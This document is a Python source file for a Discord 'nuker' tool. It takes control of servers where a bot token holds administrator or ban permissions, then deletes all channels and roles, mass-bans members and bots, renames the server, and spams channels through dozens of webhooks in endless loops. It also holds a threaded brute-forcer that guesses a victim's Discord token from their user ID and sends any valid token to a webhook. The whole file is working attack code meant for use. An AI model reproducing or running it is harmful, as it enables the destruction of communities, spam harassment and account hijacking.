import discord
from discord import Intents
import asyncio
import requests
import time
import os
from os import system
import sys

# Explicitly add the current directory to the system path
sys.path.insert(0, os.path.abspath(os.path.dirname(__file__)))

from Config.Util import *
from Config.Config import *

coolasstitle = "Nuker"
system("title " + coolasstitle)

# ANSI escape sequences for coloring the output
RED = "\033[91m"
GREEN = "\033[92m"
RESET = "\033[0m"

NUKER_COLOR = "\033[94m"  # Blue color for "Nuker"

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_colorful_ascii():
    clear_screen()
    time.sleep(1)
    print(f"""
{NUKER_COLOR}                  ::::    ::: :::    ::: :::    ::: :::::::::: :::::::::  
                  :+:+:   :+: :+:    :+: :+:   :+:  :+:        :+:    :+:  
                 :+:+:+  +:+ +:+    +:+ +:+  +:+   +:+        +:+    +:+ 
                +#+ +:+ +#+ +#+    +:+ +#++:++    +#++:++#   +#++:++#: 
               +#+  +#+#+# +#+    +#+ +#+  +#+   +#+        +#+    +#+ 
              #+#   #+#+# #+#    #+# #+#   #+#  #+#        #+#    #+#  
             ###    ####  ########  ###    ### ########## ###    ###  
{RESET}""")

async def delete_channels(guild):
    for channel in guild.channels:
        try:
            await channel.delete()
            print(f"{GREEN}Deleted channel: {channel.name}{RESET}")
        except Exception as e:
            print(f"{RED}Failed to delete channel: {channel.name} - {e}{RESET}")

async def delete_existing_webhooks(channel):
    try:
        webhooks = await channel.webhooks()
        for webhook in webhooks:
            await webhook.delete()
            print(f"{GREEN}Deleted existing webhook: {webhook.name}{RESET}")
    except Exception as e:
        print(f"{RED}Failed to delete existing webhooks in channel {channel.name}: {e}{RESET}")

async def create_webhooks(channel, num_bots):
    webhooks = []
    for i in range(num_bots):
        webhook = await channel.create_webhook(name=f"Spammer{i+1}")
        webhooks.append(webhook)
        print(f"{GREEN}Webhook {i+1} created in channel {channel.name}{RESET}")
    return webhooks
async def spam_message(webhook, message):
    while True:
        data = {
            "content": message,
            "username": "MURDERED BY GANEY",
            "avatar_url": "https://i.imgur.com/qH9OULub.jpg"  # Optional: avatar for webhook messages
        }
        requests.post(webhook.url, json=data)
        await asyncio.sleep(0.01)  # Adjust delay as needed to avoid rate limits

async def delete_roles(guild):
    for role in guild.roles:
        try:
            await role.delete()
            print(f"{GREEN}Deleted role: {role.name}{RESET}")
        except Exception as e:
            print(f"{RED}Failed to delete role: {role.name} - {e}{RESET}")

async def ban_bots(guild):
    for member in guild.members:
        if member.bot:
            try:
                await member.ban(reason="murdered by ganey")
                print(f"{GREEN}Banned bot: {member.name}{RESET}")
            except Exception as e:
                print(f"{RED}Failed to ban bot: {member.name} - {e}{RESET}")

async def rename_server(guild):
    new_name = input("Enter the new name for the server: ")
    try:
        await guild.edit(name=new_name)
        print(f"{GREEN}Renamed server to {new_name}{RESET}")
    except Exception as e:
        print(f"{RED}Failed to rename server: {e}{RESET}")

async def ban_unban_all(guild, action):
    if action == 'ban':
        for member in guild.members:
            try:
                await member.ban(reason="murdered by ganey")
                print(f"{GREEN}Banned member: {member.name}{RESET}")
            except Exception as e:
                print(f"{RED}Failed to ban member: {member.name} - {e}{RESET}")
    elif action == 'unban':
        bans = await guild.bans()
        for ban_entry in bans:
            user = ban_entry.user
            try:
                await guild.unban(user)
                print(f"{GREEN}Unbanned member: {user.name}{RESET}")
            except Exception as e:
                print(f"{RED}Failed to unban member: {user.name} - {e}{RESET}")
async def manage_channels(guild, action):
    if action == '1':
        channel_count = int(input("How many channels do you want to create? "))
        channel_name = input("Enter the name for the channels: ")
        
        channels = []
        for i in range(channel_count):
            channel = await guild.create_text_channel(channel_name)
            channels.append(channel)
            print(f"{GREEN}Channel {channel.name} created successfully{RESET}")
        
        create_webhooks_choice = input("Do you want to create webhooks for each channel? (y/n): ").strip().lower()
        if create_webhooks_choice == 'y':
            webhooks = []
            num_bots = int(input("Enter the number of webhooks to create per channel: "))
            for channel in channels:
                channel_webhooks = await create_webhooks(channel, num_bots)
                webhooks.extend(channel_webhooks)
            
            spam_choice = input("Do you want to spam the webhooks? (y/n): ").strip().lower()
            if spam_choice == 'y':
                custom_message = input("Enter the message to spam: ")
                tasks = [spam_message(webhook, custom_message) for webhook in webhooks]
                await asyncio.gather(*tasks)
    elif action == '2':
        await delete_channels(guild)
    elif action == '3':
        await rename_server(guild)
        await delete_channels(guild)
        
        channel_count = int(input("How many channels do you want to create? "))
        channel_name = input("Enter the name for the channels: ")
        
        webhooks = []
        for i in range(channel_count):
            channel = await guild.create_text_channel(channel_name)
            channel_webhooks = await create_webhooks(channel, 1)
            webhooks.extend(channel_webhooks)
            print(f"{GREEN}Channel {channel.name} created successfully with webhook{RESET}")

        custom_message = input("Enter the message to spam: ")
        tasks = [spam_message(webhook, custom_message) for webhook in webhooks]
        await asyncio.gather(*tasks)

        await delete_roles(guild)
        await ban_bots(guild)

        ban_unban_skip_choice = input("Do you want to ban all, unban all, or skip? (ban/unban/skip): ").strip().lower()
        if ban_unban_skip_choice == 'ban' or ban_unban_skip_choice == 'unban':
            await ban_unban_all(guild, ban_unban_skip_choice)
    elif action == '4':
        await rename_server(guild)
    elif action == '5':
        await discord_token_grabber()
import time

async def discord_token_grabber():
    
    try:
        import string
        import requests
        import json
        import random
        import threading
        import base64
    except Exception as e:
        ErrorModule(e)
    
    Title("Discord Token To Id")
    
    try:
        Slow(discord_banner)
        userid = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Victim ID -> {reset}")
        OnePartToken = str(base64.b64encode(userid.encode("utf-8")), "utf-8").replace("=", "")
        print(f'{BEFORE + current_time_hour() + AFTER} {INFO} Part One Token: {white}{OnePartToken}.{reset}')
    
        brute = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Find the second part by brute force? (y/n) -> {reset}")
        if brute not in ['y', 'Y', 'Yes', 'yes', 'YES']:
            Continue()
            Reset()
    
        webhook = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Webhook? (y/n) -> {reset}")
        if webhook in ['y', 'Y', 'Yes', 'yes', 'YES']:
            webhook_url = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Webhook URL -> {reset}")
            CheckWebhook(webhook_url)
    
        try:
            threads_number = int(input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Threads Number -> {reset}"))
        except:
            ErrorNumber()
    
        def send_webhook(embed_content):
            payload = {
                'embeds': [embed_content],
                'username': username_webhook,
                'avatar_url': avatar_webhook
            }
    
            headers = {
                'Content-Type': 'application/json'
            }
    
            requests.post(webhook_url, data=json.dumps(payload), headers=headers)
    
        def token_check():
            first = OnePartToken
            second = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(random.choice([6])))
            third = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(random.choice([38])))
            token = f"{first}.{second}.{third}"
    
            try:
                response = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token, 'Content-Type': 'application/json'})
                if response.status_code == 200:
                    if webhook in ['y']:
                        embed_content = {
                            'title': 'Token Valid!',
                            'description': f"**Token:**\n```{token}```",
                            'color': color_webhook,
                            'footer': {
                                "text": username_webhook,
                                "icon_url": avatar_webhook,
                            }
                        }
                        send_webhook(embed_content)
                        print(f"{BEFORE_GREEN + current_time_hour() + AFTER_GREEN} {GEN_VALID} Status:  {white}Valid{green}  Token: {white}{token}{green}")
                    else:
                        print(f"{BEFORE_GREEN + current_time_hour() + AFTER_GREEN} {GEN_VALID} Status:  {white}Valid{green}  Token: {white}{token}{green}")
                else:
                    print(f"{BEFORE + current_time_hour() + AFTER} {GEN_INVALID} Status: {white}Invalid{red} Token: {white}{token}{red}")
            except:
                print(f"{BEFORE + current_time_hour() + AFTER} {GEN_INVALID} Status: {white}Error{red} Token: {white}{token}{red}")
            
            # Adding a 0.1-second delay to each attempt
            time.sleep(0.1)
    
        def request():
            threads = []
            try:
                for _ in range(int(threads_number)):
                    t = threading.Thread(target=token_check)
                    t.start()
                    threads.append(t)
            except:
                ErrorNumber()
    
            for thread in threads:
                thread.join()
    
        while True:
            request()
    
    except Exception as e:
        Error(e)

async def validate_token_and_guild(token):
    intents = discord.Intents.default()
    intents.members = True  # Enable the members intent to fetch members information

    async with discord.Client(intents=intents) as client:

        @client.event
        async def on_ready():
            servers_with_perms = []

            for guild in client.guilds:
                # Check if the bot has higher permissions than a normal member
                member = guild.get_member(client.user.id)
                if member.guild_permissions.administrator or member.guild_permissions.manage_guild or member.guild_permissions.ban_members:
                    servers_with_perms.append(guild)

            if servers_with_perms:
                print("Servers available to nuke:")
                for guild in servers_with_perms:
                    print(f"{guild.name} (ID: {guild.id})\n")  # Adds an extra new line for spacing

                server_name = input("""Which server do you want to nuke (you need perms): 
                                    
""").strip()
                print()
                guild_id = next((guild.id for guild in servers_with_perms if guild.name == server_name), None)
                
                if guild_id:
                    guild = client.get_guild(guild_id)
                    action = input("""whatchu wanna do?:
                                   

1 - create channels
2 - delete channels
3 - completely mess up the server (ban all bots, delete channels, create new channels, spam messages, delete roles, then ban or unban all)
4 - rename server
5 - Discord token grabber

""").strip()
                    await manage_channels(guild, action)
                else:
                    print(f"{RED}Invalid server name.{RESET}")
            else:
                print(f"{RED}No servers available with the necessary permissions.{RESET}")

        try:
            await client.start(token)
        except discord.errors.LoginFailure:
            print(f"{RED}Invalid{RESET} | Token: {token[:37]}")
        except Exception as e:
            print(f"{RED}Error{RESET} | Token: {token[:37]} | Exception: {e}")
        finally:
            await client.close()



    try:
        await client.login(token)
        await client.connect()
    except discord.errors.LoginFailure:
        print(f"{RED}Invalid{RESET} | Token: {token[:37]}")
    except Exception as e:
        print(f"{RED}Error{RESET} | Token: {token[:37]} | Exception: {e}")

async def main():
    print_colorful_ascii()
    print("Select an option:")
    print("1. Discord token bruteforce")
    print("2. Validate token and manage server")

    option = input("Enter your choice (1 or 2): ").strip()

    if option == "1":
        await discord_token_grabber()
    elif option == "2":
        # Read the token from the tokens.txt file
        with open('tokens.txt', 'r') as file:
            tokens = [line.strip() for line in file.readlines()]

        formatted_tokens = []
        for i, token in enumerate(tokens):
            parts = token.split(',')
            if len(parts) == 2:
                formatted_tokens.append((parts[0], parts[1]))
            else:
                formatted_tokens.append((f"Token {i+1}", token))

        if len(formatted_tokens) > 1:
            print("Tokens available:")
            for i, (name, token) in enumerate(formatted_tokens, 1):
                print(f"{i}. Name: {name}, Token: {token[:37]}...\n")  # Adds an extra new line for spacing and shows a truncated token
            
            selected_token_index = int(input("Select a token to use (enter the number): ")) - 1
            selected_token = formatted_tokens[selected_token_index][1]
            
            await validate_token_and_guild(selected_token)
        elif len(formatted_tokens) == 1:
            await validate_token_and_guild(formatted_tokens[0][1])
        else:
            print(f"{RED}No valid tokens available.{RESET}")
    else:
        print(f"{RED}Invalid choice. Please select 1 or 2.{RESET}")

if __name__ == "__main__":
    asyncio.run(main())
